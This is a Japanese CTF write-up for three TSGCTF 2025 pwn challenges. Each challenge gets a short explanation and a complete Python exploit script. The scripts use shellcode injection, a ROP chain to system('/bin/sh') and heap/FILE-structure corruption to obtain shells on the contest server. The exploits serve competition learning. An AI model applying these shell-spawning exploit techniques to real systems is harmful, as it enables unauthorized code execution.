---
title: TSGCTF 2025 Writeup
tags:
  - ctf
  - writeup
  - jp
date: 2025-12-29 14:08:05
---


TSGCTF 2025にKUDoSで出場  
全体11位、国内6位でした。  

自分はpwn3問を解いたのでそのwriteupを載せます。  

- [pwn](#pwn)
  - [closed\_ended](#closed_ended)
  - [TSG-land](#tsg-land)
  - [pryspace](#pryspace)
- [感想](#感想)

## pwn
### closed_ended
バイナリ中の0x4010a7~0x402000を1byteだけ書き換えられ、またscanfによるbofも存在する。
close(1)の影響でmainにreturnしても2回目の入力は受け付けられない。
素直に命令領域のどこかを変えることを考える。
```
  40109e:       e8 9d ff ff ff          call   401040 <close@plt>
  4010a3:       85 c0                   test   eax,eax
  4010a5:       74 13                   je     4010ba <main+0x4a>
  4010a7:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4010ab:       64 48 2b 04 25 28 00    sub    rax,QWORD PTR fs:0x28
  4010b2:       00 00 
  4010b4:       75 61                   jne    401117 <main+0xa7>
  4010b6:       c9                      leave
  4010b7:       31 c0                   xor    eax,eax
  4010b9:       c3                      ret
  4010ba:       48 8d 75 e0             lea    rsi,[rbp-0x20]
```
0x4015b5の1byteを変えることで、scanfによるbofをcanaryで検知できなくなる&
2回目のmainでclose(1)が失敗しても、後続の処理を継続してくれるようになるので、bss領域にshellcodeを仕込んでジャンプ

```python
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./closed_ended"
#"""
HOST = "34.84.25.24"
PORT = 50037
"""
HOST = "localhost"
PORT = 50037
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
        sock = Socket(HOST, PORT)
else:
        sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)
addr_bss = elf.section(".bss")

# shellcode = asm(shellcraft.amd64.linux.dup2(0, 1) + shellcraft.amd64.linux.sh()) from pwntools
sc = b'1\xffj\x01^j!X\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
def exploit():
        payload = b''
        payload += b'a'*0x12
        payload += p64(addr_bss+0xc00)
        payload += p64(0x401071)
        payload += p64(0x401115+0x12)
        payload += p64(0x401105)
        sock.sendline(hex(0x4010b5))
        sock.sendline(b'\x00')
        sock.sendline(payload)

        # read(0,0x401150,0x800);jmp 0x401150;
        stage1 = b"\x48\xC7\xC2\x00\x08\x00\x00\x48\xC7\xC6\x50\x11\x40\x00\x48\x31\xFF\x48\x31\xC0\x0F\x05\xeb\x23"
        sock.sendline(stage1)
        stage2 = sc
        input()
        sock.sendline(stage2)
        sock.interactive()

if __name__ == "__main__":
        exploit()
```

### TSG-land
setjump()/longjmp()を使用して関数間を行き来しているのでstackに保存している内容が保証されない。  
1~4のコマンドはいい感じにstackが被っており、3のコマンドでstackの値を4bytes単位でスライドパズルの容量で入れ替えることができる。
4のコマンドで任意の数値をstack上に用意できて、1のコマンドでAAW,2のコマンドでAARができるようになる。

```python
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./chall"
#"""
HOST = "34.84.25.24"
PORT = 13579
"""
HOST = "localhost"
PORT = 13579
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	sock = Socket(HOST, PORT)
else:
	sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)
libc = ELF('./libc.so.6')

def select(i):
	sock.sendlineafter("you? > ", str(i))

def select_c(c):
	sock.sendlineafter("> ", c)

def exploit():
	select(1)
	sock.sendlineafter("> ", "0")
	select(3)
	sock.sendlineafter("> ", "q")
	select(2)
	sock.sendlineafter("> ", "0")
	select(3)
	t = sock.recvline().split()
	bin_base = ((int(t[0],10) & 0xffffffff) | ((int(t[1],10) & 0xffffffff) << 32)) - 0x2080
	elf.base = bin_base
	print("[+] bin_base = "+hex(bin_base))
	select_c("s")
	select_c("s")
	select_c("d")
	select_c("d")
	select_c("d")
	select_c("q")

	select(4)
	n_upper = (elf.symbol("env")+0x10)&0xffffffff
	n_lower = (elf.symbol("env")+0x10)>>32
	n = (n_upper << 32) | n_lower
	select_c("1")
	select_c(str(n))
	select_c("0")

	select(3)
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("q")
		
	select(4)
	n_upper = elf.got("puts")&0xffffffff
	n_lower = elf.got("puts")>>32
	n = (n_upper << 32) | n_lower
	select_c("1")
	select_c(str(n))
	select_c("0")

	select(3)
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("q")
	
	select(2)	
	select_c("3")	
	stack_ret = u64(sock.recvline())-0x470
	print("[+] stack_ret = "+hex(stack_ret))
	select_c("0")	
	input("stack_ret")
	select(3)
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("q")

	select(4)
	n_upper = stack_ret&0xffffffff
	n_lower = stack_ret>>32
	n = (n_upper << 32) | n_lower
	select_c("1")
	select_c(str(n))
	select_c("0")
	
	select(3)
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("q")
	
	select(2)	
	select_c("3")	
	libc_puts = u64(sock.recvline())
	libc.base = libc_puts - libc.symbol("puts")
	print("[+] libc_base = "+hex(libc.base))
	select_c("0")	
	
	select(3)
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	select_c("s")
	select_c("d")
	select_c("w")
	select_c("w")
	select_c("a")
	select_c("s")
	
	select_c("a")
	select_c("a")
	select_c("s")
	select_c("d")
	select_c("d")
	select_c("d")
	select_c("w")
	select_c("a")
	select_c("a")
	select_c("a")
	select_c("s")
	select_c("d")
	select_c("d")
	select_c("q")

	select(1)
	select_c("1")
	payload = b''
	payload += p64(next(libc.gadget("pop rdi; ret;"))+1)
	payload += p64(next(libc.gadget("pop rdi; ret;")))
	payload += p64(next(libc.search(b"/bin/sh")))
	payload += p64(libc.symbol("system"))
	sock.sendline(payload)
	select_c("0")

	sock.interactive()	

if __name__ == "__main__":
	exploit()
```

### pryspace
ガッチガチのheap問  
1度しか実行できないmerge_noteの操作で、自身と同じindexを指定することによるmemmoveのheapオーバーフローがある。
オーバフローが発生するchunkのサイズは0xe10で固定であり、このchunkの後ろに破壊するchunkを用意できるかが肝になる。
結論から言うと、fastbinに繋がったchunkはfastbinサイズ以上のchunk確保時にconsolidateされてunsorted binにマージされる挙動があることを利用する。
保持できるchunkのスロットが16個である制限やmerge以外では0xf0以下のchunkの確保可能という制約のおかげで、かなり時間を要した。

```python
#!/usr/bin/python3
from ptrlib import *
import sys

FILE_NAME = "./pryspace"
#"""
HOST = "34.84.25.24"
PORT = 48736
"""
HOST = "localhost"
PORT = 48736
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	sock = Socket(HOST, PORT)
else:
	sock = Process(FILE_NAME)

sock.debug = True
elf = ELF(FILE_NAME)
libc = ELF('./libc.so.6')

def create(idx, data):
	sock.sendlineafter("> ", "1")
	sock.sendlineafter("> ", str(idx))
	sock.send(data)

def copy(src, dst):
	sock.sendlineafter("> ", "2")
	sock.sendlineafter("> ", str(src))
	sock.sendlineafter("> ", str(dst))

def show(idx):
	sock.sendlineafter("> ", "3")
	sock.sendlineafter("> ", str(idx))

def merge(l):
	sock.sendlineafter("> ", "4")
	sock.sendlineafter("> ", len(l))
	for i in l:
		sock.sendlineafter("> ", str(i))

def delete(idx):
	sock.sendlineafter("> ", "5")
	sock.sendlineafter("> ", str(idx))

def prepare_1(c, size):
	create(0, c*size+b'\n')
	for i in range(1,8):
		copy(0,i)
	for i in range(1,8):
		delete(i)
	delete(0)

def prepare_2(c, size):
	create(0, c*size+b'\n')
	for i in range(1,16):
		copy(0, i)
	delete(0)
	copy(15,0)
	for i in range(1,16):
		delete(i)
	delete(0)


def exploit():
	create(15, '15\n')
	create(14, '14\n')
	create(13, '13\n')
	create(12, '12\n')
	create(11, '11\n')
	delete(15)
	delete(14)
	delete(13)
	delete(12)
	delete(11)
	# prepare tache slot
	prepare_1(b"3", 0x20)
	prepare_1(b"4", 0x30)
	prepare_1(b"5", 0x40)
	prepare_1(b"6", 0x50)
	prepare_1(b"7", 0x60)

	# prepare chunk 0xe10=(0x30+0x40+..+0x70)*9
	prepare_2(b"3", 0x20)
	prepare_2(b"4", 0x30)
	prepare_2(b"5", 0x40)
	prepare_2(b"6", 0x50)
	prepare_2(b"7", 0x60)
	
	create(0, b'8'*0x76+b'\n')
	copy(0,1)
	copy(0,2)
	copy(0,3)
	copy(0,4)
	copy(0,5)
	copy(0,6)
	copy(0,7)
	copy(0,8)
	copy(0,9)
	copy(0,10)
	copy(0,11)

	create(12,'x'*0x2+'\n')
	create(13,'y'*0xc5+'\n')
	create(14,'z'*0xdf)
	payload = b'x'*(0xdf-2)+p16(0x80*9+1)
	create(15,payload)
	merge([14,0,0,0,13,13,13,13,13,13,13,13,12,15])

	# fuge unsortedbin
	delete(1)
	copy(11,1)
	show(2)
	libc_unsorted = u64(sock.recv(6))
	libc.base = libc_unsorted - 0x21ace0
	print("[+] libc_base = "+hex(libc.base))
	
	copy(11,1)
	delete(2)
	show(1)
	heap_maybe = (u64(sock.recv(5)) << 12)
	heap_base = heap_maybe - 0x2000
	print("[+] heap_base = "+hex(heap_base))
	
	copy(11,1)
	delete(5)
	delete(4)
	
	#create(1,'a\n')
	payload = b''
	payload += b'0'*0x78
	payload += p64(0x81)
	payload += p64((libc.symbol("_IO_list_all")-0x70)^(heap_maybe>>12))
	payload += b'\n'
	create(1, payload)

	delete(12)
	payload = b''
	payload += b'A'*0x70
	payload += p64(heap_base+0x480)
	payload += b'\n'
	create(12,payload)
	copy(12,5)
	copy(12,4)

	addr_fake_file = heap_base+0x480

	fake_file = b''
	fake_file += b"/bin/sh\x00"
	fake_file += p64(1)								# _wide_data->_write_base(+0x18)
	fake_file += p64(libc.symbol("system"))			# _wide_data->_write_ptr(+0x20)
	fake_file += b"\x00"*(0x88-len(fake_file))		# lockp
	fake_file += p64(addr_fake_file-0x18)
	fake_file += b"\x00"*(0xa0-len(fake_file))
	fake_file += p64(addr_fake_file-0x10)								# _wide_data
	fake_file += b"\x00"*(0xc0-len(fake_file))
	fake_file += p64(1)								# _mode
	fake_file += b"\x00"*(0xd0-len(fake_file))
	fake_file += p64(addr_fake_file-0x8)								# _wide_data->vtable
	fake_file += p64(libc.symbol("_IO_wfile_jumps")+0x30)# vtable

	payload = b''
	payload = fake_file
	payload += b'\n'
	delete(13)
	create(13, payload)
	sock.interactive()	

if __name__ == "__main__":
	exploit()
```


## 感想
スライドパズルやガチガチheap問など幅がありとても楽しめました。
運営の皆様ありがとうございます。

今年はなんとDomestic Finalがあるらしく、予選突破できそうでなにより